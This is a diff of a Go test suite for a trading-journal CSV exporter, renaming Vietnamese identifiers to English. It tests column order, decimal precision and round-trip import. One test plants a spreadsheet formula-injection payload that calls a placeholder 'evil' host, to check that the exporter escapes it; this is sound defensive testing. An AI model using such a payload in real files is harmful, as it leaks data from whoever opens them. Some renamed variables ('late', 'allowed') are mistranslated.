@@ -16,7 +16,7 @@ import (
 	"journal/internal/metrics"
 )
 
-func accMau() domain.Account {
+func accSample() domain.Account {
 	return domain.Account{
 		ID:             1,
 		Code:           "ACC1",
@@ -26,7 +26,7 @@ func accMau() domain.Account {
 	}
 }
 
-func lenhMau() []domain.Trade {
+func sampleTrade() []domain.Trade {
 	d := func(s string) *decimal.Decimal {
 		v := decimal.RequireFromString(s)
 		return &v
@@ -65,9 +65,9 @@ func lenhMau() []domain.Trade {
 	}
 }
 
-func xuat(t *testing.T, rows []domain.Trade) (string, [][]string) {
+func exportCSV(t *testing.T, rows []domain.Trade) (string, [][]string) {
 	t.Helper()
-	e, err := metrics.Enrich(rows, accMau())
+	e, err := metrics.Enrich(rows, accSample())
 	require.NoError(t, err)
 
 	var buf bytes.Buffer
@@ -82,8 +82,8 @@ func xuat(t *testing.T, rows []domain.Trade) (string, [][]string) {
 
 // Thứ tự cột ghim nguyên văn theo trading-journal-plan.md §0: input trước,
 // derived sau. File xuất ra phải mở lên trông giống file gốc.
-func TestWriteCSVThuTuCot(t *testing.T) {
-	_, recs := xuat(t, lenhMau())
+func TestWriteCSVColumnOrder(t *testing.T) {
+	_, recs := exportCSV(t, sampleTrade())
 	require.Equal(t, []string{
 		"STT", "Account", "Day", "Symbol", "Long/ Short",
 		"Entry", "Exit", "Volume", "Profit", "Profit lý thuyết", "Phí",
@@ -97,52 +97,52 @@ func TestWriteCSVThuTuCot(t *testing.T) {
 	}, recs[0])
 }
 
-func TestWriteCSVGiaTriDong(t *testing.T) {
-	_, recs := xuat(t, lenhMau())
+func TestWriteCSVRowValues(t *testing.T) {
+	_, recs := exportCSV(t, sampleTrade())
 	require.Len(t, recs, 3, "1 header + 2 dòng")
 
 	h := recs[0]
-	o := func(dong int, cot string) string {
-		for i, ten := range h {
-			if ten == cot {
-				return recs[dong][i]
+	cell := func(row int, col string) string {
+		for i, name := range h {
+			if name == col {
+				return recs[row][i]
 			}
 		}
-		t.Fatalf("không có cột %q", cot)
+		t.Fatalf("không có cột %q", col)
 		return ""
 	}
 
-	require.Equal(t, "1", o(1, "STT"))
-	require.Equal(t, "2026-06-09", o(1, "Day"), "Day theo timezone account")
-	require.Equal(t, "XAUUSD", o(1, "Symbol"))
-	require.Equal(t, "Long", o(1, "Long/ Short"))
-	require.Equal(t, "500", o(1, "Profit"))
-	require.Equal(t, "490", o(1, "Profit (đã trừ phí)"), "net = profit − fee")
-	require.Equal(t, "100", o(1, "Tổng điểm"))
-	require.Equal(t, domain.ClassPlanned, o(1, "Loại lệnh"))
-	require.Equal(t, "W24", o(1, "Week"))
-	require.Equal(t, "06/2026", o(1, "Month"))
-	require.Equal(t, "1", o(1, "Win/Loss"))
-	require.Equal(t, "490", o(1, "Profit cộng dồn theo lệnh"))
-	require.Equal(t, "0", o(1, "Drawdown"))
+	require.Equal(t, "1", cell(1, "STT"))
+	require.Equal(t, "2026-06-09", cell(1, "Day"), "Day theo timezone account")
+	require.Equal(t, "XAUUSD", cell(1, "Symbol"))
+	require.Equal(t, "Long", cell(1, "Long/ Short"))
+	require.Equal(t, "500", cell(1, "Profit"))
+	require.Equal(t, "490", cell(1, "Profit (đã trừ phí)"), "net = profit − fee")
+	require.Equal(t, "100", cell(1, "Tổng điểm"))
+	require.Equal(t, domain.ClassPlanned, cell(1, "Loại lệnh"))
+	require.Equal(t, "W24", cell(1, "Week"))
+	require.Equal(t, "06/2026", cell(1, "Month"))
+	require.Equal(t, "1", cell(1, "Win/Loss"))
+	require.Equal(t, "490", cell(1, "Profit cộng dồn theo lệnh"))
+	require.Equal(t, "0", cell(1, "Drawdown"))
 
-	require.Equal(t, "Short", o(2, "Long/ Short"))
-	require.Equal(t, "-205", o(2, "Profit (đã trừ phí)"))
-	require.Equal(t, "285", o(2, "Profit cộng dồn theo lệnh"))
+	require.Equal(t, "Short", cell(2, "Long/ Short"))
+	require.Equal(t, "-205", cell(2, "Profit (đã trừ phí)"))
+	require.Equal(t, "285", cell(2, "Profit cộng dồn theo lệnh"))
 }
 
 // score_total = nil là "chưa chấm", KHÁC hẳn 0 điểm. Xuất ra 0 thì mở file
 // lên sẽ đọc thành "chấm rồi, được 0 điểm" — sai, và sai một cách thuyết phục.
-func TestWriteCSVLenhChuaChamRaOTrongChuKhongPhaiSo0(t *testing.T) {
-	_, recs := xuat(t, lenhMau())
+func TestWriteCSVUnscoredTradeGivesEmptyCellNotZero(t *testing.T) {
+	_, recs := exportCSV(t, sampleTrade())
 	h := recs[0]
-	idx := func(ten string) int {
+	idx := func(name string) int {
 		for i, v := range h {
-			if v == ten {
+			if v == name {
 				return i
 			}
 		}
-		t.Fatalf("không có cột %q", ten)
+		t.Fatalf("không có cột %q", name)
 		return -1
 	}
 	require.Equal(t, "", recs[2][idx("Tổng điểm")], "chưa chấm → ô rỗng")
@@ -154,19 +154,19 @@ func TestWriteCSVLenhChuaChamRaOTrongChuKhongPhaiSo0(t *testing.T) {
 
 // Tiền đi thẳng từ decimal.String(). Một lần đi qua float64 là mất chữ số, và
 // con số 18 chữ số dưới đây sẽ lộ ra ngay.
-func TestWriteCSVTienKhongDiQuaFloat(t *testing.T) {
-	rows := lenhMau()
+func TestWriteCSVMoneyNeverPassesThroughFloat(t *testing.T) {
+	rows := sampleTrade()
 	rows[0].Profit = decimal.RequireFromString("12345678901234567.89")
 	rows[0].Fee = decimal.Zero
-	_, recs := xuat(t, rows)
+	_, recs := exportCSV(t, rows)
 	require.Contains(t, recs[1], "12345678901234567.89")
 }
 
-func TestWriteCSVBocDauPhayVaXuongDong(t *testing.T) {
-	_, recs := xuat(t, lenhMau())
+func TestWriteCSVQuotesCommasAndNewlines(t *testing.T) {
+	_, recs := exportCSV(t, sampleTrade())
 	h := recs[0]
-	for i, ten := range h {
-		if ten == "Notes" {
+	for i, name := range h {
+		if name == "Notes" {
 			require.Equal(t, "ghi chú có dấu phẩy, và\nxuống dòng", recs[2][i])
 			return
 		}
@@ -176,11 +176,11 @@ func TestWriteCSVBocDauPhayVaXuongDong(t *testing.T) {
 
 // Excel mở CSV UTF-8 không BOM sẽ hiện tiếng Việt thành ký tự rác.
 func TestWriteCSVCoBOM(t *testing.T) {
-	s, _ := xuat(t, lenhMau())
+	s, _ := exportCSV(t, sampleTrade())
 	require.True(t, strings.HasPrefix(s, "\uFEFF"), "phải mở đầu bằng BOM")
 }
 
-func TestWriteCSVDanhSachRongVanCoHeader(t *testing.T) {
+func TestWriteCSVEmptyListStillHasHeader(t *testing.T) {
 	var buf bytes.Buffer
 	require.NoError(t, exporter.WriteCSV(&buf, nil))
 	r := csv.NewReader(strings.NewReader(strings.TrimPrefix(buf.String(), "\uFEFF")))
@@ -191,10 +191,10 @@ func TestWriteCSVDanhSachRongVanCoHeader(t *testing.T) {
 
 // Round-trip: xuất ra rồi nhập lại phải giữ nguyên 17 trường input. Đây là
 // test chứng minh export không phải đường một chiều.
-func TestWriteCSVRoundTripQuaImporter(t *testing.T) {
-	goc := lenhMau()
+func TestWriteCSVRoundTripThroughImporter(t *testing.T) {
+	orig := sampleTrade()
 	var buf bytes.Buffer
-	e, err := metrics.Enrich(goc, accMau())
+	e, err := metrics.Enrich(orig, accSample())
 	require.NoError(t, err)
 	require.NoError(t, exporter.WriteCSV(&buf, e))
 
@@ -205,26 +205,26 @@ func TestWriteCSVRoundTripQuaImporter(t *testing.T) {
 	require.Empty(t, rep.Errors, "file web xuất ra phải tự nhập lại được sạch")
 	require.Len(t, rep.Rows, 2)
 
-	for i, muon := range goc {
-		duoc := rep.Rows[i]
-		require.Equal(t, muon.Symbol, duoc.Symbol, "dòng %d", i)
-		require.Equal(t, muon.Direction, duoc.Direction, "dòng %d", i)
-		require.Equal(t, muon.Profit.String(), duoc.Profit.String(), "dòng %d", i)
-		require.Equal(t, muon.Fee.String(), duoc.Fee.String(), "dòng %d", i)
-		require.Equal(t, muon.Setup, duoc.Setup, "dòng %d", i)
-		require.Equal(t, muon.Timeframe, duoc.Timeframe, "dòng %d", i)
-		require.Equal(t, muon.EntryQuality, duoc.EntryQuality, "dòng %d", i)
-		require.Equal(t, muon.InTradeQuality, duoc.InTradeQuality, "dòng %d", i)
-		require.Equal(t, muon.ExitQuality, duoc.ExitQuality, "dòng %d", i)
-		require.Equal(t, muon.Psychology, duoc.Psychology, "dòng %d", i)
-		require.Equal(t, muon.Notes, duoc.Notes, "dòng %d", i)
-		require.True(t, muon.EnteredAt.Equal(duoc.EnteredAt), "dòng %d: entered_at", i)
+	for i, late := range orig {
+		allowed := rep.Rows[i]
+		require.Equal(t, late.Symbol, allowed.Symbol, "dòng %d", i)
+		require.Equal(t, late.Direction, allowed.Direction, "dòng %d", i)
+		require.Equal(t, late.Profit.String(), allowed.Profit.String(), "dòng %d", i)
+		require.Equal(t, late.Fee.String(), allowed.Fee.String(), "dòng %d", i)
+		require.Equal(t, late.Setup, allowed.Setup, "dòng %d", i)
+		require.Equal(t, late.Timeframe, allowed.Timeframe, "dòng %d", i)
+		require.Equal(t, late.EntryQuality, allowed.EntryQuality, "dòng %d", i)
+		require.Equal(t, late.InTradeQuality, allowed.InTradeQuality, "dòng %d", i)
+		require.Equal(t, late.ExitQuality, allowed.ExitQuality, "dòng %d", i)
+		require.Equal(t, late.Psychology, allowed.Psychology, "dòng %d", i)
+		require.Equal(t, late.Notes, allowed.Notes, "dòng %d", i)
+		require.True(t, late.EnteredAt.Equal(allowed.EnteredAt), "dòng %d: entered_at", i)
 
-		if muon.ProfitTheory == nil {
-			require.Nil(t, duoc.ProfitTheory, "dòng %d: nil phải về nil", i)
+		if late.ProfitTheory == nil {
+			require.Nil(t, allowed.ProfitTheory, "dòng %d: nil phải về nil", i)
 		} else {
-			require.NotNil(t, duoc.ProfitTheory, "dòng %d", i)
-			require.Equal(t, muon.ProfitTheory.String(), duoc.ProfitTheory.String(), "dòng %d", i)
+			require.NotNil(t, allowed.ProfitTheory, "dòng %d", i)
+			require.Equal(t, late.ProfitTheory.String(), allowed.ProfitTheory.String(), "dòng %d", i)
 		}
 	}
 }
@@ -233,57 +233,57 @@ func TestWriteCSVRoundTripQuaImporter(t *testing.T) {
 // = + - @ như CÔNG THỨC lúc mở file, nên =HYPERLINK("http://evil/"&A1) trong
 // một note sẽ tự chạy trên máy người mở. File nhật ký hay được gửi đi (kế
 // toán, quỹ, coach) nên đây không phải rủi ro tự hại.
-func TestWriteCSVBocOChuKhoiThanhCongThuc(t *testing.T) {
-	lenh := lenhMau()
-	lenh[0].Notes = `=HYPERLINK("http://evil/"&A1,"click")`
-	lenh[0].Setup = "+1234"
-	lenh[0].Symbol = "@SUM(A1)"
+func TestWriteCSVWrapsTextCellsToPreventFormulas(t *testing.T) {
+	trade := sampleTrade()
+	trade[0].Notes = `=HYPERLINK("http://evil/"&A1,"click")`
+	trade[0].Setup = "+1234"
+	trade[0].Symbol = "@SUM(A1)"
 
-	_, recs := xuat(t, lenh)
+	_, recs := exportCSV(t, trade)
 	h, d := recs[0], recs[1]
-	o := func(cot string) string {
-		for i, ten := range h {
-			if ten == cot {
+	cell := func(col string) string {
+		for i, name := range h {
+			if name == col {
 				return d[i]
 			}
 		}
-		t.Fatalf("không có cột %q", cot)
+		t.Fatalf("không có cột %q", col)
 		return ""
 	}
 
-	require.Equal(t, `'=HYPERLINK("http://evil/"&A1,"click")`, o("Notes"))
-	require.Equal(t, "'+1234", o("Setup"))
-	require.Equal(t, "'@SUM(A1)", o("Symbol"))
+	require.Equal(t, `'=HYPERLINK("http://evil/"&A1,"click")`, cell("Notes"))
+	require.Equal(t, "'+1234", cell("Setup"))
+	require.Equal(t, "'@SUM(A1)", cell("Symbol"))
 }
 
 // Mặt kia của cùng một quyết định: cột SỐ không được bọc. "-205" ở Profit là
 // số âm hợp lệ chứ không phải công thức — bọc nó là phá round-trip, và hai
 // yêu cầu này kéo ngược nhau nên phải ghim cả hai trong cùng một file test.
-func TestWriteCSVKhongBocCotSoAm(t *testing.T) {
-	_, recs := xuat(t, lenhMau())
+func TestWriteCSVDoesNotWrapNegativeNumberColumns(t *testing.T) {
+	_, recs := exportCSV(t, sampleTrade())
 	h := recs[0]
-	o := func(dong int, cot string) string {
-		for i, ten := range h {
-			if ten == cot {
-				return recs[dong][i]
+	cell := func(row int, col string) string {
+		for i, name := range h {
+			if name == col {
+				return recs[row][i]
 			}
 		}
-		t.Fatalf("không có cột %q", cot)
+		t.Fatalf("không có cột %q", col)
 		return ""
 	}
-	require.Equal(t, "-200", o(2, "Profit"), "số âm giữ nguyên, không có nháy dẫn đầu")
-	require.Equal(t, "-205", o(2, "Profit (đã trừ phí)"))
+	require.Equal(t, "-200", cell(2, "Profit"), "số âm giữ nguyên, không có nháy dẫn đầu")
+	require.Equal(t, "-205", cell(2, "Profit (đã trừ phí)"))
 }
 
 // Bọc chỉ đúng nếu importer gỡ lại được: nếu không, mỗi vòng xuất-rồi-nhập
 // đội thêm một dấu nháy và note của người dùng trôi dần.
-func TestWriteCSVRoundTripGiuNguyenChuCoKyTuCongThuc(t *testing.T) {
-	lenh := lenhMau()
-	lenh[0].Notes = "=1+1"
-	lenh[0].Setup = "-breakout"
+func TestWriteCSVRoundTripKeepsTextWithFormulaChars(t *testing.T) {
+	trade := sampleTrade()
+	trade[0].Notes = "=1+1"
+	trade[0].Setup = "-breakout"
 
 	var buf bytes.Buffer
-	e, err := metrics.Enrich(lenh, accMau())
+	e, err := metrics.Enrich(trade, accSample())
 	require.NoError(t, err)
 	require.NoError(t, exporter.WriteCSV(&buf, e))
 
@@ -309,40 +309,40 @@ func TestWriteCSVRoundTripGiuNguyenChuCoKyTuCongThuc(t *testing.T) {
 //
 // Test kiểm bằng hành vi: nhồi giá trị nhận ra được vào TẤT CẢ cột derived rồi
 // đòi lệnh nhập về phải sạch bóng chúng.
-func TestKhongCotDerivedNaoBiDocThanhCotInput(t *testing.T) {
-	batBuoc := map[string]bool{"Day": true, "Symbol": true, "Long/ Short": true, "Profit": true}
+func TestNoDerivedColumnIsReadAsInput(t *testing.T) {
+	required := map[string]bool{"Day": true, "Symbol": true, "Long/ Short": true, "Profit": true}
 
 	// 18 cột đầu là input (theo §0), phần còn lại là derived. Chỉ nhồi rác vào
 	// phần derived — nhồi cả vào cột input thì test chỉ đang kiểm parse lỗi.
-	const soCotInput = 18
+	const inputColCount = 18
 
-	var cot, o []string
-	for i, ten := range exporter.Header() {
-		cot = append(cot, ten)
+	var col, cell []string
+	for i, name := range exporter.Header() {
+		col = append(col, name)
 		switch {
-		case ten == "Day":
-			o = append(o, "2026-06-09")
-		case ten == "Symbol":
-			o = append(o, "XAUUSD")
-		case ten == "Long/ Short":
-			o = append(o, "BUY")
-		case ten == "Profit":
-			o = append(o, "500")
-		case i < soCotInput:
-			o = append(o, "") // cột input còn lại: để rỗng, hợp lệ
+		case name == "Day":
+			cell = append(cell, "2026-06-09")
+		case name == "Symbol":
+			cell = append(cell, "XAUUSD")
+		case name == "Long/ Short":
+			cell = append(cell, "BUY")
+		case name == "Profit":
+			cell = append(cell, "500")
+		case i < inputColCount:
+			cell = append(cell, "") // cột input còn lại: để rỗng, hợp lệ
 		default:
 			// Chuỗi này không hợp lệ với BẤT KỲ cột input nào: không phải số,
 			// không phải enum, không phải ngày. Nếu nó lọt vào một ô input thì
 			// hoặc parse lỗi, hoặc hiện ra ở Setup/Notes — cả hai đều đỏ.
-			o = append(o, "DERIVED_"+ten)
+			cell = append(cell, "DERIVED_"+name)
 		}
 	}
-	require.Subset(t, cot, []string{"Day", "Symbol", "Long/ Short", "Profit"})
+	require.Subset(t, col, []string{"Day", "Symbol", "Long/ Short", "Profit"})
 
 	var b strings.Builder
 	w := csv.NewWriter(&b)
-	require.NoError(t, w.Write(cot))
-	require.NoError(t, w.Write(o))
+	require.NoError(t, w.Write(col))
+	require.NoError(t, w.Write(cell))
 	w.Flush()
 	require.NoError(t, w.Error())
 
@@ -364,16 +364,16 @@ func TestKhongCotDerivedNaoBiDocThanhCotInput(t *testing.T) {
 	require.NotContains(t, t0.Psychology, "DERIVED_")
 	require.Equal(t, "500", t0.Profit.String(), "cột input vẫn phải đọc đúng")
 
-	for ten := range batBuoc {
-		require.Contains(t, cot, ten, "header xuất ra phải còn đủ cột input bắt buộc")
+	for name := range required {
+		require.Contains(t, col, name, "header xuất ra phải còn đủ cột input bắt buộc")
 	}
 
 	// Ghim lớp 2 trực tiếp: dựng một file CỐ Ý trùng tên, cột derived đứng
 	// SAU. Cột trái nhất phải thắng. Không có ràng buộc này thì lớp 1 là thứ
 	// duy nhất đỡ, và lớp 1 chỉ là một sự trùng hợp về cách đặt tên.
-	trung := "Day,Symbol,Long/ Short,Profit,Vào lệnh,Vào lệnh\n" +
+	dup := "Day,Symbol,Long/ Short,Profit,Vào lệnh,Vào lệnh\n" +
 		"2026-06-09,XAUUSD,BUY,500," + domain.EntryQualities[0] + ",DERIVED_RAC\n"
-	rep2, err := importer.Parse(strings.NewReader(trung), loc)
+	rep2, err := importer.Parse(strings.NewReader(dup), loc)
 	require.NoError(t, err)
 	require.Empty(t, rep2.Errors, "cột trùng tên bên phải phải bị bỏ qua, không gây lỗi")
 	require.Len(t, rep2.Rows, 1)
@@ -381,9 +381,9 @@ func TestKhongCotDerivedNaoBiDocThanhCotInput(t *testing.T) {
 		"phải lấy cột TRÁI NHẤT; lấy cột phải là đọc giá trị derived vào ô input")
 
 	// Và ghim luôn tiền đề của lớp 2: mọi cột input nằm trước mọi cột derived.
-	for i, ten := range exporter.Header() {
-		if batBuoc[ten] {
-			require.Less(t, i, soCotInput, "cột input %q phải nằm trong %d cột đầu", ten, soCotInput)
+	for i, name := range exporter.Header() {
+		if required[name] {
+			require.Less(t, i, inputColCount, "cột input %q phải nằm trong %d cột đầu", name, inputColCount)
 		}
 	}
 }
